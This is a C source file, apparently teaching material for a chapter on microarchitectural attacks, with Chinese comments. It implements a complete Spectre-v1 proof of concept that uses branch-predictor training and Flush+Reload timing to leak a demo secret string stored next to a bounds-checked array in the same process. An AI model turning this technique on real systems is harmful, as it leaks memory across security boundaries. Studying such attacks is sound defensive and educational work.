/*
 * spectre_ch35.c — Spectre-v1 End-to-End PoC
 * Ch 35《微架構攻擊》— 串起來：一條真實 end-to-end 洩漏鏈
 *
 * 環境：Intel Core i7-10700 (Comet Lake), WSL2 Ubuntu 22.04
 * 編譯：gcc -O1 -fno-stack-protector -o spectre_ch35 spectre_ch35.c
 * 執行：sudo wrmsr -p 2 0x1a4 0xf  # 關 prefetcher，噪音更小
 *       taskset -c 2 ./spectre_ch35
 *
 * 攻擊鏈（整合 Ch 0 + Ch 3 + Ch 6 + Ch 13 + Ch 14）：
 *
 *   Ch 0  harness：rdtscp-only 計時，門檻 150 cycles
 *   Ch 3  快取幾何：STRIDE=512 讓各 probe slot 落在不同 cache set
 *   Ch 6  Flush+Reload：flush probe -> 觸發 -> reload 讀時間
 *   Ch 13 推測執行：bounds check 還在讀 DRAM 時，CPU 已推測進 if body
 *   Ch 14 Spectre-v1：if(x < size) probe[array1[x]*STRIDE] 是 gadget
 *
 * 佈局設計：
 *   array1[0..15]  = 合法資料 (值 1..16)
 *   array1[16..55] = secret（緊鄰！正偏移保證推測視窗夠大）
 *   array1_size    = 16（可被 clflush 踢出 cache，讓 bounds check 慢）
 *
 * 噪音處理：
 *   - 訓練值 1..16 對應 probe[512..8192]，計分時排除這些 index
 *   - probe[0] 因全域陣列頁邊界效應持續被 touch，也排除
 *   - 亂序 reload（Fisher-Yates shuffle），避免 prefetcher 預讀
 *   - 每 byte 5000 輪取眾數，信號遠超過雜訊
 */
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <x86intrin.h>

/* ---- 量測參數（與 Ch 0 calibrate 一致）---- */
#define THRESHOLD   150     /* HIT~24 / MISS~218 cycles；門檻取中間 */
#define STRIDE      512     /* probe slot 間距：8 個 cache line，避免 alias */
#define NSLOTS      256     /* 256 個 byte 值各一個 probe slot              */
#define ROUNDS      5000    /* 每 byte 採樣輪數                             */

/* ---- 受害者資料（全域，讓 clflush 能定位）---- */
unsigned int array1_size = 16;          /* bounds check 的上界，可被 clflush */
uint8_t  array1[16 + 64];              /* [0..15] 合法；[16..] secret       */
uint8_t  probe[NSLOTS * STRIDE];       /* Flush+Reload probe array           */
uint8_t  temp_out = 0;                 /* 防止推測讀被優化消除               */

/* ---- Spectre-v1 gadget ---- */
/*
 * noinline + noclone：確保編譯器不把這個函式內聯到呼叫點，
 * 內聯後可能讓預測器在 call site 層級看穿越界而不推測。
 *
 * 推測視窗說明：
 *   array1_size 被 clflush 踢出 cache -> 讀它需 ~218 cycles
 *   CPU 在等 bounds check 的結果時，假設「x < array1_size」成立，
 *   推測執行 probe[array1[x] * STRIDE] 這行 load
 *   -> array1[x=16+i] = secret[i] = v
 *   -> probe[v * STRIDE] 被帶進 cache
 *   -> bounds check 回來發現 x 越界，退出推測執行、取消暫存器，
 *      但 cache 狀態已改變——這就是側信道的洩漏點。
 */
__attribute__((noinline, noclone))
void victim(size_t x) {
    if (x < array1_size)
        temp_out &= probe[array1[x] * STRIDE];
}

/* ---- F+R 計時（與 Ch 0 harness 完全相同）---- */
/*
 * rdtscp 不加前置 lfence：與 Ch 0 calibrate 一致。
 * 關鍵：第二個 rdtscp 需要等 *p 的 load 完成才能被 retire，
 * 因此它的資料依賴隱含了足夠的序列化。
 */
static inline uint64_t timed_load(volatile uint8_t *p) {
    unsigned junk;
    uint64_t t0 = __rdtscp(&junk);
    (void)*p;                          /* force load */
    return __rdtscp(&junk) - t0;
}

/* ---- 判斷某個 probe index 是否是訓練雜訊 ---- */
/*
 * 訓練路徑每輪呼叫 victim(train_x)，train_x ∈ 0..15
 * array1[train_x] = train_x+1 ∈ 1..16
 * 所以 probe[1*STRIDE..16*STRIDE] 被合法路徑 touch，排除
 * probe[0] 因全域陣列頁邊界效應持續命中，一起排除
 */
static int is_noise_index(int idx) {
    if (idx == 0) return 1;           /* 頁邊界誤報 */
    for (int i = 0; i < 16; i++)
        if (array1[i] == (uint8_t)idx) return 1;  /* 訓練值 1..16 */
    return 0;
}

/* ---- 一個 byte 的洩漏：回傳 0..255 ---- */
/*
 * 使用 Kocher 的 bitmask trick（原始 spectre.c 同款）：
 *   每 30 輪循環：第 0, 6, 12, 18, 24 輪 -> 攻擊（malicious_x）
 *                 其餘 25 輪             -> 訓練（train_x，合法）
 *   用 bitmask 而非 if/else，避免 branch predictor 在 main 層級洩漏意圖
 */
static int leak_byte(size_t x_oob) {
    int scores[NSLOTS] = {0};
    int order[NSLOTS];

    for (int round = 0; round < ROUNDS; round++) {
        /* Step 1: flush probe（清空 cache，讓 readout 只靠推測路徑的 touch）*/
        for (int i = 0; i < NSLOTS; i++)
            _mm_clflush(&probe[i * STRIDE]);
        _mm_mfence();

        size_t train_x = (size_t)(round % (int)array1_size); /* 0..15 */

        /* Step 2 & 3: 訓練 + 攻擊（29 次循環，每 6 次插一次攻擊）*/
        for (int j = 29; j >= 0; j--) {
            _mm_clflush(&array1_size);
            /* 短 delay：clflush 不序列化，讓它有時間完成 */
            for (volatile int d = 0; d < 100; d++) {}
            /*
             * Bitmask：j % 6 == 0 時 x = x_oob（攻擊），否則 x = train_x
             * 不用 branch，預測器不會學到「第 0 次會越界」
             */
            size_t mask = (size_t)(((j % 6) - 1) & ~(size_t)0xFFFF);
            mask = mask | (mask >> 16);
            size_t x = train_x ^ (mask & (x_oob ^ train_x));
            victim(x);
        }

        /* Step 4: Flush+Reload readout（隨機順序） */
        for (int i = 0; i < NSLOTS; i++) order[i] = i;
        for (int i = NSLOTS - 1; i > 0; i--) {
            int j = rand() % (i + 1);
            int tmp = order[i]; order[i] = order[j]; order[j] = tmp;
        }
        for (int i = 0; i < NSLOTS; i++) {
            int idx = order[i];
            uint64_t t = timed_load(&probe[idx * STRIDE]);
            /* 命中（< 150 cycles）且不是訓練雜訊 -> 計分 */
            if ((int)t < THRESHOLD && !is_noise_index(idx))
                scores[idx]++;
        }
    }

    /* 找眾數（最高分 byte 值） */
    int best = 17; /* 從 17 開始，跳過訓練區 1..16 */
    for (int i = 17; i < NSLOTS; i++)
        if (scores[i] > scores[best]) best = i;
    return best;
}

/* ---- 主程式 ---- */
int main(void) {
    /* 填入受害者資料 */
    for (int i = 0; i < 16; i++)
        array1[i] = (uint8_t)(i + 1);
    static const char secret_str[] =
        "The Magic Words are Squeamish Ossifrage.";
    size_t slen = strlen(secret_str);
    memcpy(array1 + 16, secret_str, slen + 1);

    /* touch probe array（讓 OS 配置實體頁，避免 page fault 在 readout 裡） */
    memset(probe, 1, sizeof(probe));

    printf("=== Spectre-v1 End-to-End PoC ===\n");
    printf("CPU:       Intel Core i7-10700 (Comet Lake)\n");
    printf("OS:        WSL2 Ubuntu 22.04\n");
    printf("Threshold: %d cycles  (HIT ~24 / MISS ~218, prefetcher off)\n\n",
           THRESHOLD);

    printf("Victim layout:\n");
    printf("  array1      @ %p  [size=%u]\n", (void*)array1, array1_size);
    printf("  secret      @ %p  (= array1 + 16, 正偏移 +16)\n",
           (void*)(array1 + 16));
    printf("  probe       @ %p  [%d slots × %d bytes = %d KB]\n\n",
           (void*)probe, NSLOTS, STRIDE, NSLOTS * STRIDE / 1024);

    printf("Target secret: \"%s\"\n\n", secret_str);
    printf("攻擊中（每 byte %d 輪，Kocher bitmask trick + 亂序 reload）...\n\n",
           ROUNDS);

    printf("idx  x_oob  leaked  actual  match\n");
    printf("---  -----  ------  ------  -----\n");

    int correct = 0;
    for (size_t i = 0; i < slen; i++) {
        size_t x_oob = 16 + i;
        int leaked = leak_byte(x_oob);
        char actual = secret_str[i];
        int ok = (leaked == (unsigned char)actual);
        correct += ok;
        printf(" %2zu   %4zu    '%c'     '%c'    %s\n",
               i, x_oob,
               (leaked >= 0x20 && leaked < 0x7f) ? (char)leaked : '?',
               actual, ok ? "OK" : "MISS");
        fflush(stdout);
    }

    printf("\n=== 結果: %d/%zu bytes 正確 (%.0f%%) ===\n",
           correct, slen, 100.0 * correct / slen);
    return 0;
}
